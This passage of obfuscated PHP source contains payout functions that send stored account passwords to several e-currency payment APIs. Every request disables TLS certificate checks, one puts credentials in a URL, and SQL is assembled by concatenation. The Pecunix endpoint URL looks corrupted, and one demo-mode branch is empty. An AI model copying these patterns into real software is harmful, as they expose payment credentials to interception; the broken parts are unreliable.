      curl_setopt ($elnlcujLDk, CURLOPT_POSTFIELDS, 'AccountID=' . rawurlencode ($elnlcroEyb[$elnlcebOCn['elnlcntfW']]) . '&PassPhrase=' . rawurlencode ($elnlcOHPa) . '&Payee_Account=' . rawurlencode ($elnlcgobCh) . '&Amount=' . rawurlencode ($elnlcdrkS) . '&PAY_IN=' . rawurlencode ($elnlcroEyb[$elnlcebOCn['elnlcBcUy']]) . ('' . '&WORTH_OF=Gold&Memo=' . $elnlcqAwQ . '&IGNORE_RATE_CHANGE=y'));
      curl_setopt ($elnlcujLDk, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcujLDk);
      curl_close ($elnlcujLDk);
      $elnlcDxKrG = array ();
      if (preg_match ('/<input type=hidden name=PAYMENT_BATCH_NUM VALUE="(\\d+)">/ims', $a, $elnlcDxKrG))
      {
        return array (1, '', $elnlcDxKrG[1]);
      }
      else
      {
        if (preg_match ('/<input type=hidden name=ERROR VALUE="(.*?)">/ims', $a, $elnlcDxKrG))
        {
          $elnlcmHqz = preg_replace ('/&lt;/i', '<', $elnlcDxKrG[1]);
          $elnlcmHqz = preg_replace ('/&gt;/i', '>', $elnlcmHqz);
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' ' . $elnlcmHqz);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcSquPB . ('' . ' ' . $elnlcmHqz), '');
        }
        else
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcSquPB . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcxfvdc ('' . $elnlcSquPB . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcSquPB . ' Curl functions are not available');
    }

  }

  function elnlcmkth ($elnlcmqvST, $elnlcdrkS, $elnlcgobCh, $elnlcqAwQ, $elnlcSquPB)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($elnlcroEyb[$elnlcebOCn['elnlcDBNH']] == $elnlcebOCn['elnlciyAL'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlcyxlp']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcgobCh == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to AlertPay account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid AlertPay account', '');
    }

    list ($elnlcbKfED, $elnlcvjWVG) = elnlcnftjg ($elnlcgobCh, 11);
    if ($elnlcbKfED == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcvjWVG . '\'';
      mysql_query ($q);
      return array (0, $elnlcvjWVG);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcmqvST == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'alertpay_account_password\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcumVgr = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }
      }
      else
      {
        $elnlcumVgr = $elnlcmqvST;
      }

      $elnlcujLDk = curl_init ();
      $elnlcqAwQ = rawurlencode ($elnlcqAwQ);
      $elnlcIDxg = sprintf ('USER=%s&PASSWORD=%s&AMOUNT=%s&CURRENCY=%s&RECEIVEREMAIL=%s&SENDEREMAIL=%s&PURCHASETYPE=%s&NOTE=%s&TESTMODE=%s', urlencode ($elnlcroEyb[$elnlcebOCn['elnlcakhb']]), urlencode ($elnlcumVgr), urlencode ($elnlcdrkS), 'USD', urlencode ($elnlcgobCh), '', 0, urlencode ($elnlcqAwQ), 0);
      curl_setopt ($elnlcujLDk, CURLOPT_URL, $elnlcebOCn['elnlcgviwt']);
      curl_setopt ($elnlcujLDk, CURLOPT_POST, true);
      curl_setopt ($elnlcujLDk, CURLOPT_POSTFIELDS, $elnlcIDxg);
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, true);
      curl_setopt ($elnlcujLDk, CURLOPT_HEADER, false);
      curl_setopt ($elnlcujLDk, CURLOPT_TIMEOUT, 30);
      curl_setopt ($elnlcujLDk, CURLOPT_SSL_VERIFYPEER, false);
      $a = curl_exec ($elnlcujLDk);
      curl_close ($elnlcujLDk);
      parse_str (urldecode ($a), $elnlcfAAm);
      $elnlcDxKrG = array ();
      if ($elnlcfAAm[$elnlcebOCn['elnlceQdxR']] == 100)
      {
        return array (1, '', $elnlcfAAm[$elnlcebOCn['elnlcoLnQI']]);
      }
      else
      {
        if (200 < $elnlcfAAm[$elnlcebOCn['elnlceQdxR']])
        {
          $elnlcmHqz = $elnlcfAAm[$elnlcebOCn['elnlceQdxR']] . ': ' . $elnlcfAAm[$elnlcebOCn['elnlctbFA']];
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' ' . $elnlcmHqz);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcSquPB . ('' . ' ' . $elnlcmHqz), '');
        }
        else
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcSquPB . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcxfvdc ('' . $elnlcSquPB . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcSquPB . ' Curl functions are not available');
    }

  }

  function elnlckwszc ($elnlcmqvST, $elnlcdrkS, $elnlcgobCh, $elnlcqAwQ, $elnlcSquPB)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    $elnlcdrkS = sprintf ('%0.2f', floor ($elnlcdrkS * 100) / 100);
    if ($elnlcroEyb[$elnlcebOCn['elnlcyxlp']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcgobCh == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can not process withdrawal to Evocash account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid EvoCash account', '');
    }

    list ($elnlcbKfED, $elnlcvjWVG) = elnlcnftjg ($elnlcgobCh, 1);
    if ($elnlcbKfED == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcvjWVG . '\'';
      mysql_query ($q);
      return array (0, $elnlcvjWVG);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcmqvST == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'evocash_account_password\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcgtAtU = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }

        $q = 'select v from hm2_pay_settings where n=\'evocash_transaction_code\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcEuMuN = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }
      }
      else
      {
        list ($elnlcgtAtU, $elnlcEuMuN) = preg_split ('/\\|/', $elnlcmqvST);
      }

      $elnlcujLDk = curl_init ();
      $elnlcqAwQ = rawurlencode ($elnlcqAwQ);
      curl_setopt ($elnlcujLDk, CURLOPT_URL, 'https://www.evocash.com/evoswift/instantpayment.cfm?payingaccountid=' . rawurlencode ($elnlcroEyb[$elnlcebOCn['elnlcNAgC']]) . '&username=' . rawurlencode ($elnlcroEyb[$elnlcebOCn['elnlcLOJmo']]) . '&password=' . rawurlencode ($elnlcgtAtU) . '&transaction_code=' . rawurlencode ($elnlcEuMuN) . '&amount=' . rawurlencode ($elnlcdrkS) . ('' . '&reference=&memo=' . $elnlcqAwQ . '&receivingaccountid=') . rawurlencode ($elnlcgobCh) . '');
      curl_setopt ($elnlcujLDk, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcujLDk);
      curl_close ($elnlcujLDk);
      $elnlcDxKrG = array ();
      if (preg_match ('/<INPUT TYPE="Hidden" NAME="PayingTransactionID" VALUE="(.*?)">/ims', $a, $elnlcDxKrG))
      {
        return array (1, '', $elnlcDxKrG[1]);
      }
      else
      {
        if (preg_match ('/<INPUT TYPE="Hidden" NAME="Error" VALUE="(.*?)">/ims', $a, $elnlcDxKrG))
        {
          $elnlcmHqz = $elnlcDxKrG[1];
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' ' . $elnlcmHqz);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcSquPB . ('' . ' ' . $elnlcmHqz), '');
        }
        else
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcSquPB . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcxfvdc ('' . $elnlcSquPB . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcSquPB . ' Curl functions are not available');
    }

  }

  function elnlcvopx ($elnlcmqvST, $elnlcdrkS, $elnlcgobCh, $elnlcqAwQ, $elnlcSquPB)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($elnlcroEyb[$elnlcebOCn['elnlcDBNH']] == $elnlcebOCn['elnlciyAL'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlcyxlp']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcgobCh == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to IntGold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid IntGold account', '');
    }

    list ($elnlcbKfED, $elnlcvjWVG) = elnlcnftjg ($elnlcgobCh, 2);
    if ($elnlcbKfED == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcvjWVG . '\'';
      mysql_query ($q);
      return array (0, $elnlcvjWVG);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcmqvST == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'intgold_password\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcyThgg = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }
      }
      else
      {
        $elnlcyThgg = $elnlcmqvST;
      }

      if ($elnlcmqvST == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'intgold_password\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcyThgg = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }

        $q = 'select v from hm2_pay_settings where n=\'intgold_transaction_code\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcHDoD = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }
      }
      else
      {
        list ($elnlcyThgg, $elnlcHDoD) = preg_split ('/\\|/', $elnlcmqvST);
      }

      $elnlcujLDk = curl_init ();
      $elnlcqAwQ = rawurlencode ($elnlcqAwQ);
      curl_setopt ($elnlcujLDk, CURLOPT_URL, 'https://intgold.com/cgi-bin/autopay.cgi');
      curl_setopt ($elnlcujLDk, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcujLDk, CURLOPT_POST, 1);
      curl_setopt ($elnlcujLDk, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcujLDk, CURLOPT_POSTFIELDS, 'ACCOUNTID=' . rawurlencode ($elnlcroEyb[$elnlcebOCn['elnlcDHWm']]) . '&PASSWORD=' . rawurlencode ($elnlcyThgg) . '&SECPASSWORD=' . rawurlencode ($elnlcHDoD) . '&RECEIVER=' . rawurlencode ($elnlcgobCh) . '&AMOUNT=' . rawurlencode ($elnlcdrkS) . '&NOTE=' . $elnlcqAwQ);
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcujLDk);
      curl_close ($elnlcujLDk);
      $elnlcDxKrG = array ();
      if (preg_match ('' . '/Success\\s*TRANSACTION_ID:(.*?)$/ims', $a, $elnlcDxKrG))
      {
        return array (1, '', $elnlcDxKrG[1]);
      }
      else
      {
        $e = elnlcxfvdc ('' . $elnlcSquPB . ' ' . $a);
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcSquPB . ('' . ' ' . $a), '');
      }
    }
    else
    {
      $e = elnlcxfvdc ('' . $elnlcSquPB . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcSquPB . ' Curl functions are not available');
    }

  }

  function elnlcrynb ($elnlcmqvST, $elnlcdrkS, $elnlcgobCh, $elnlcqAwQ, $elnlcSquPB)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($elnlcroEyb[$elnlcebOCn['elnlcDBNH']] == $elnlcebOCn['elnlciyAL'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlcyxlp']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcgobCh == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to eeeCureency account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid eeeCurrency account', '');
    }

    list ($elnlcbKfED, $elnlcvjWVG) = elnlcnftjg ($elnlcgobCh, 8);
    if ($elnlcbKfED == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcvjWVG . '\'';
      mysql_query ($q);
      return array (0, $elnlcvjWVG);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcmqvST == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'eeecurrency_password\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcPVFL = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }

        $q = 'select v from hm2_pay_settings where n=\'eeecurrency_transaction_code\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlckEvcM = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }
      }
      else
      {
        list ($elnlcPVFL, $elnlckEvcM) = preg_split ('/\\|/', $elnlcmqvST);
      }

      $elnlcujLDk = curl_init ();
      $elnlcqAwQ = rawurlencode ($elnlcqAwQ);
      curl_setopt ($elnlcujLDk, CURLOPT_URL, 'https://eeecurrency.com/cgi-bin/autopay.cgi');
      curl_setopt ($elnlcujLDk, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcujLDk, CURLOPT_POST, 1);
      curl_setopt ($elnlcujLDk, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcujLDk, CURLOPT_POSTFIELDS, 'ACCOUNTID=' . rawurlencode ($elnlcroEyb[$elnlcebOCn['elnlcGnGL']]) . '&PASSWORD=' . rawurlencode ($elnlcPVFL) . '&SECPASSWORD=' . rawurlencode ($elnlckEvcM) . '&RECEIVER=' . rawurlencode ($elnlcgobCh) . '&AMOUNT=' . rawurlencode ($elnlcdrkS) . ('' . '&NOTE=' . $elnlcqAwQ));
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcujLDk);
      curl_close ($elnlcujLDk);
      $elnlcDxKrG = array ();
      if (preg_match ('' . '/Success\\s*TRANSACTION_ID:(.*?)$/ims', $a, $elnlcDxKrG))
      {
        return array (1, '', $elnlcDxKrG[1]);
      }
      else
      {
        $e = elnlcxfvdc ('' . $elnlcSquPB . ' ' . $a);
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcSquPB . ('' . ' ' . $a), '');
      }
    }
    else
    {
      $e = elnlcxfvdc ('' . $elnlcSquPB . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcSquPB . ' Curl functions are not available');
    }

  }

  function elnlcpwvmo ($elnlcmqvST, $elnlcdrkS, $elnlcgobCh, $elnlcqAwQ, $elnlcSquPB)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($elnlcroEyb[$elnlcebOCn['elnlcDBNH']] == $elnlcebOCn['elnlciyAL'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlcyxlp']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcgobCh == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty Pecunix account.\'';
      mysql_query ($q);
      return array (0, 'Invalid Pecunix account', '');
    }

    list ($elnlcbKfED, $elnlcvjWVG) = elnlcnftjg ($elnlcgobCh, 9);
    if ($elnlcbKfED == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcvjWVG . '\'';
      mysql_query ($q);
      return array (0, $elnlcvjWVG);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcmqvST == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'pecunix_password\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcCNum = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }
      }
      else
      {
        $elnlcCNum = $elnlcmqvST;
      }

      $elnlcujLDk = curl_init ();
      $elnlcIbBG = elnlcupcg ('{px_time}');
      $elnlcCVNpo = strtoupper (md5 ($elnlcCNum . ':' . $elnlcIbBG));
      $elnlcIDxg = '
    <TransferRequest>
      <Transfer>
        <TransferId> </TransferId>
        <Payer> ' . htmlentities ($elnlcroEyb[$elnlcebOCn['elnlcLpuuS']], ENT_NOQUOTES) . ' </Payer>
        <Payee> ' . htmlentities ($elnlcgobCh, ENT_NOQUOTES) . ' </Payee>
        <CurrencyId> GAU </CurrencyId>
        <Equivalent>
          <CurrencyId> USD </CurrencyId>
          <Amount> ' . htmlentities ($elnlcdrkS, ENT_NOQUOTES) . ' </Amount>
        </Equivalent>
        <FeePaidBy> Payee </FeePaidBy>
        <Memo> ' . htmlentities ($elnlcqAwQ, ENT_NOQUOTES) . ('' . ' </Memo>
      </Transfer>
      <Auth>
        <Token> ' . $elnlcCVNpo . ' </Token>
      </Auth>
    </TransferRequest>
    ');
      $elnlcujLDk = curl_init ();
      curl_setopt ($elnlcujLDk, CURLOPT_URL, 'https://pxi.pecunix.com/money.refined...transfer');
      curl_setopt ($elnlcujLDk, CURLOPT_POST, 1);
      curl_setopt ($elnlcujLDk, CURLOPT_POSTFIELDS, $elnlcIDxg);
      curl_setopt ($elnlcujLDk, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcujLDk);
      curl_close ($elnlcujLDk);
      $elnlcsLBI = elnlcqecw ($a);
      if ($elnlcsLBI[$elnlcebOCn['elnlccIMd']] == $elnlcebOCn['elnlcDeuNJ'])
      {
        return array (1, '', $elnlcsLBI[$elnlcebOCn['elnlcjpTJ']]);
      }
      else
      {
        if ($elnlcsLBI[$elnlcebOCn['elnlccIMd']] == $elnlcebOCn['elnlcorfdI'])
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' ' . $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] . ' ' . $elnlcsLBI[$elnlcebOCn['elnlcIEpfS']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcxfvdc ('' . $elnlcSquPB . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcSquPB . ' Curl functions are not available');
    }

  }

  function elnlcfksls ($elnlcmqvST, $elnlcdrkS, $elnlcgobCh, $elnlcqAwQ, $elnlcSquPB)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($elnlcroEyb[$elnlcebOCn['elnlcDBNH']] == $elnlcebOCn['elnlciyAL'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlcyxlp']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcgobCh == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty LibertyReserve account.\'';
      mysql_query ($q);
      return array (0, 'Invalid LibertyReserve account', '');
    }

    list ($elnlcbKfED, $elnlcvjWVG) = elnlcnftjg ($elnlcgobCh, 15);
    if ($elnlcbKfED == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcvjWVG . '\'';
      mysql_query ($q);
      return array (0, $elnlcvjWVG);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcmqvST == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'libertyreserve_password\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlcWVGWo = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }

        $elnlcmOVp = $elnlcroEyb[$elnlcebOCn['elnlczNVA']];
      }
      else
      {
        list ($elnlcWVGWo, $elnlcmOVp) = preg_split ('/\\|/', $elnlcmqvST);
      }

      $elnlcujLDk = curl_init ();
      $elnlcCVNpo = strtoupper (elnlcupcg ($elnlcWVGWo . ':{lr_time}'));
      $elnlcIDxg = '<TransferRequest id="' . rand (1000000, 9999999) . '">
  <Auth>
    <ApiName>' . htmlspecialchars ($elnlcmOVp) . ('' . '</ApiName>
    <Token>' . $elnlcCVNpo . '</Token>
  </Auth>
  <Transfer>
    <TransferType>transfer</TransferType>
    <Payer>') . htmlentities ($elnlcroEyb[$elnlcebOCn['elnlcimKw']], ENT_NOQUOTES) . '</Payer>
    <Payee>' . htmlentities ($elnlcgobCh, ENT_NOQUOTES) . '</Payee>
    <CurrencyId>' . htmlentities ($elnlcroEyb[$elnlcebOCn['elnlckSns']]) . '</CurrencyId>
    <Amount>' . htmlentities ($elnlcdrkS, ENT_NOQUOTES) . '</Amount>
    <Memo>' . htmlentities ($elnlcqAwQ, ENT_NOQUOTES) . '</Memo>
    <Anonymous>false</Anonymous>
  </Transfer>
</TransferRequest>';
      $elnlcujLDk = curl_init ();
      curl_setopt ($elnlcujLDk, CURLOPT_URL, 'https://api.libertyreserve.com/xml/transfer.aspx?req=' . urlencode ($elnlcIDxg));
      curl_setopt ($elnlcujLDk, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
      $elnlcdccrA = array ('User-Agent: Mozilla/5.0');
      curl_setopt ($elnlcujLDk, CURLOPT_HTTPHEADER, $elnlcdccrA);
      $a = curl_exec ($elnlcujLDk);
      curl_close ($elnlcujLDk);
      $elnlcroEyb[$elnlcebOCn['elnlclioI']] = $elnlcIDxg;
      $elnlcroEyb[$elnlcebOCn['elnlcIotLj']] = $a;
      $elnlcsLBI = elnlcspkw ($a);
      if ($elnlcsLBI[$elnlcebOCn['elnlccIMd']] == $elnlcebOCn['elnlcDeuNJ'])
      {
        return array (1, '', $elnlcsLBI[$elnlcebOCn['elnlcjpTJ']]);
      }
      else
      {
        if ($elnlcsLBI[$elnlcebOCn['elnlccIMd']] == $elnlcebOCn['elnlcorfdI'])
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' ' . $elnlcsLBI[$elnlcebOCn['elnlcHPFOO']] . '<br>' . $elnlcsLBI[$elnlcebOCn['elnlcIEpfS']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcxfvdc ('' . $elnlcSquPB . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcxfvdc ('' . $elnlcSquPB . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcSquPB . ' Curl functions are not available');
    }

  }

  function elnlctaia ($elnlcmqvST, $elnlcdrkS, $elnlcgobCh, $elnlcqAwQ, $elnlcSquPB)
  {
    global $elnlcebOCn;
    global $elnlcroEyb;
    if ($elnlcroEyb[$elnlcebOCn['elnlcDBNH']] == $elnlcebOCn['elnlciyAL'])
    {
    }

    if ($elnlcroEyb[$elnlcebOCn['elnlcyxlp']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcgobCh == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty V-Money account.\'';
      mysql_query ($q);
      return array (0, 'Invalid V-Money account', '');
    }

    list ($elnlcbKfED, $elnlcvjWVG) = elnlcnftjg ($elnlcgobCh, 16);
    if ($elnlcbKfED == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcvjWVG . '\'';
      mysql_query ($q);
      return array (0, $elnlcvjWVG);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcmqvST == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'vmoney_password\'';
        $elnlcaJzM = mysql_query ($q);
        while ($elnlcMuwB = mysql_fetch_array ($elnlcaJzM))
        {
          $elnlclxte = elnlclehv ($elnlcMuwB[$elnlcebOCn['elnlcimMT']], $elnlcebOCn['elnlcWsIB']);
        }
      }
      else
      {
        $elnlclxte = $elnlcmqvST;
      }

      $elnlcCVNpo = md5 ($elnlcroEyb[$elnlcebOCn['elnlcCSOCL']] . $elnlclxte . elnlcupcg ('{vm_time}'));
      $elnlcIDxg = '<Request>
	<Type>Transfer</Type>
	<Auth>
		<AccountId>' . htmlentities ($elnlcroEyb[$elnlcebOCn['elnlcCSOCL']], ENT_NOQUOTES) . ('' . '</AccountId>
		<Token>' . $elnlcCVNpo . '</Token>
	</Auth>
	<Transfers>
		<Transfer>
			<ID>1</ID>
			<Payee>') . htmlentities ($elnlcgobCh, ENT_NOQUOTES) . '</Payee>
			<Amount>' . htmlentities ($elnlcdrkS, ENT_NOQUOTES) . '</Amount>
			<Memo>' . htmlentities ($elnlcqAwQ, ENT_NOQUOTES) . '</Memo>
		</Transfer>
	</Transfers>
        </Request>';
      $elnlcujLDk = curl_init ();
      curl_setopt ($elnlcujLDk, CURLOPT_URL, 'https://www.v-money.net/vai.php');
      curl_setopt ($elnlcujLDk, CURLOPT_POST, 1);
      curl_setopt ($elnlcujLDk, CURLOPT_POSTFIELDS, 'request_data=' . $elnlcIDxg);
      curl_setopt ($elnlcujLDk, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcujLDk, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcujLDk);
      curl_close ($elnlcujLDk);
      $elnlcsLBI = elnlcsjatv ($a);
      if ($elnlcsLBI[$elnlcebOCn['elnlccIMd']] == $elnlcebOCn['elnlcDeuNJ'])
      {
        return array (1, '', $elnlcsLBI[$elnlcebOCn['elnlcjpTJ']]);
      }
      else
      {
        if ($elnlcsLBI[$elnlcebOCn['elnlccIMd']] == $elnlcebOCn['elnlcorfdI'])
        {
